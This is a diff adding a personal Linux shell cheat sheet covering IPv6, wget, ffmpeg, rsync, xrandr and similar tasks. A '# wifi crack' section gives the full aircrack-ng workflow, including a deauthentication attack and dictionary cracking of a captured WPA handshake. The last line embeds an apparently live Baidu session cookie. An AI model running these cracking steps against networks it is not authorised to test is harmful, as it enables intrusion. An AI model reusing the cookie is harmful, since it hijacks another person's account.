@@ -1,0 +1,86 @@
+find . -print0 | while read -d $'\0' file; do cp -v "$file" /tmp; done
+# disable ipv6
+/etc/sysctl.d/disable-ipv6.conf
+net.ipv6.conf.all.disable_ipv6 = 1
+net.ipv6.conf.default.disable_ipv6 = 1
+net.ipv6.conf.lo.disable_ipv6 = 1
+
+/etc/default/grub
+GRUB_CMDLINE_LINUX_DEFAULT="ipv6.disable=1 quiet splash"
+sudo grub2-mkconfig -o /boot/grub/grub.cfg
+
+#WGET
+wget -nd -r -l 2 -A jpg,jpeg,png,gif http://t.co
+-nd: no directories (save all files to the current directory; -P directory changes the target directory)
+-r -l 2: recursive level 2
+-A: accepted extensions
+wget -nd -H -p -A jpg,jpeg,png,gif -e robots=off example.tumblr.com/page/{1..2}
+-H: span hosts (wget doesn't download files from different domains or subdomains by default)
+-p: page requisites (includes resources like images on each page)
+-e robots=off: execute command robotos=off as if it was part of .wgetrc file. This turns off the robot exclusion which means you ignore robots.txt and the robot meta tags (you should know the implications this comes with, take care).
+
+# wifi crack
+sudo airmon-ng start wlp8s0b1
+sudo airodump-ng wlp8s0b1mon
+sudo airodump-ng  -c 4  -w psk wlp8s0b1mon --bssid A8:57:4E:85:65:1A
+sudo aireplay-ng  -0 2 -a A8:57:4E:85:65:1A -c 80:E6:50:8A:A3:E3 wlp8s0b1mon
+-e bssid --ignore-negative-on
+aircrack-ng  -w passwd.txt psk-*.cap -b A8:57:4E:85:65:1A
+
+#concatenate videos with ffmpeg
+ffmpeg -f concat -i <(for f in ./*.wav; do echo "file '$PWD/$f'"; done) -c copy output.wav
+ffmpeg -f concat -i <(printf "file '$PWD/%s'\n" ./*.wav) -c copy output.wav
+ffmpeg -f concat -i <(find . -name '*.wav' -printf "file '$PWD/%p'\n") -c copy output.wav
+
+# create trash
+cd disk
+sudo mkdir -p .Trash-1000/{files,info}
+sudo chown -R e788b1:users .Trash-1000
+sudo chmod 700 .Trash-1000
+
+# ssh
+ls -al ~/.ssh
+ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
+
+
+
+#apack all folder to zip
+for i in *; do apack ../"$i".zip "$i"; done
+
+#loop
+find -type f -print0 | while read -r -d '' file;read -r -d '' file; do  [[ 720 -gt `identify -format '%w' "$file"` ]] && gvfs-trash "$file" ;done
+
+time find  -type f  | while read -r file ;do [[ 720 -gt `identify -format '%w' "$file"` ]] && gvfs-trash "$file" ; done
+
+# word sort
+tr ' ' '\n' <<< "zebra ant spider spider ant zebra ant" | sort -u | tr '\n' ' '
+
+# VBoxManage
+VBoxManage setextradata "Android2.3" "CustomVideoMode3" "480x720x16"
+VBoxManage setextradata global GUI/Customizations noMenuBar,noStatusBar
+
+# set fbterm
+sudo setcap 'cap_sys_tty_config+ep' /usr/bin/fbterm
+
+# test color
+(x=`tput op` y=`printf %76s`;for i in {0..256};do o=00$i;echo -e ${o:${#o}-3:3} `tput setaf $i;tput setab $i`${y// /=}$x;done)
+
+echo -e "\e[3$(( $RANDOM * 6 / 32767 + 1 ))mHello World."
+
+# backup system with rsync
+sudo -E rsync -aAXv --exclude={/dev/*,/proc/*,/sys/*,/tmp/*,/run/*,/mnt/*,/media/*,/lost+found,/home/*,/swapfile} /* /mnt/gentoo/
+
+# add local CA
+mkdir -p /usr/local/share/ca-certificates/
+cp path/to/my.crt /usr/local/share/ca-certificates/
+update-ca-certificates
+#emerge -1 app-misc/ca-certificates
+
+
+# xrandr
+xrandr --newmode "1920x1080"  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync
+xrandr --addmode VGA-0 1920x1080
+xrandr --output VGA-0 --mode 1920x1080
+
+aria2c -c -s10 -k1M -x10 -o "name.ext" --header "User-Agent: netdisk;5.2.7;PC;PC-Windows;6.2.9200;WindowsBaiduYunGuanJia" --header "Cookie: BDUSS=204T1JOT2p0Ymo5anM5dnZFbld6YmNoeE5tbktUd1RJUVk5VkFRYzJSOU41OGhWQVFBQUFBJCQAAAAAAAAAAAEAAACT9HQrRTc4OEIxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE1aoVVNWqFVR;pcsett=1437299851-96619538eef87eaf159b137445fdc813" --header "Referer: http://pan.baidu.com/disk/home" "http://d.pcs.baidu.com/file/2a13edab1d5364a7fb2a36fd1d23389d?fid=4096777643-250528-437920137243153&time=1437213474&rt=pr&sign=FDTAER-DCb740ccc5511e5e8fedcff06b081203-z7KQoKGCbdABj6tK45wiC%2fFyY2k%3d&expires=8h&prisign=unknow&chkbd=0&chkv=0&r=987840554"
+ffmpeg -f concat -i mylist.txt -c copy output
